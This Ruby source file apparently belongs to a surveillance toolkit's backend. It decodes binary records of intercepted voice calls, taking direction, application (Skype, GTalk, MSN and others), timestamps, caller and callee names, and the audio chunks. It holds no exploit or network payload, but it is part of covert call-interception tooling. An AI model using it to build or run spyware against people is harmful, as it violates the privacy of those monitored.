
require 'rcs-common/evidence/common'

module RCS

module CallEvidence
  
  LOG_VOICE_VERSION = 2008121901
  CHANNEL = { 0 => :incoming, 1 => :outgoing }
  SOFTWARE = { 0x0141 => :skype,
              0x0142 => :gtalk,
              0x0143 => :yahoo,
              0x0144 => :msn,
              0x0145 => :mobile,
              0x0146 => :skype_wsapi,
              0X0147 => :msn_wsapi }
  
  def decode_additional_header(data)
    
    raise EvidenceDeserializeError.new("incomplete evidence") if data.nil? or data.bytesize == 0
    
    binary = StringIO.new data
    version = read_uint32 binary
    
    raise EvidenceDeserializeError.new("invalid log version for voice call") unless version == LOG_VOICE_VERSION
    
    ret = Hash.new
    ret[:data] = Hash.new
    ret[:data][:channel] = CHANNEL[read_uint32 binary]
    ret[:data][:program] = SOFTWARE[read_uint32 binary]
    ret[:data][:sample_rate] = read_uint32 binary
    ret[:data][:incoming] = read_uint32 binary
    low = read_uint32 binary
    high = read_uint32 binary
    ret[:data][:start_time] = Time.from_filetime high, low
    low = read_uint32 binary
    high = read_uint32 binary
    ret[:data][:stop_time] = Time.from_filetime high, low
    
    caller_len = read_uint32 binary
    callee_len = read_uint32 binary
    
    raise RCS::EvidenceDeserializeError.new("invalid callee") if callee_len == 0
    
    ret[:data][:caller] ||= binary.read(caller_len).utf16le_to_utf8.lstrip.rstrip if caller_len != 0
    ret[:data][:peer] ||= binary.read(callee_len).utf16le_to_utf8.lstrip.rstrip if callee_len != 0
    return ret
  end
  
  def end_call?
    return true if @content.bytesize == 4 and @content == "\xff\xff\xff\xff"
  end
  
  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new
    
    info[:data][:grid_content] = chunks.join
    yield info if block_given?
    :keep_raw
  end
  
end

end # RCS::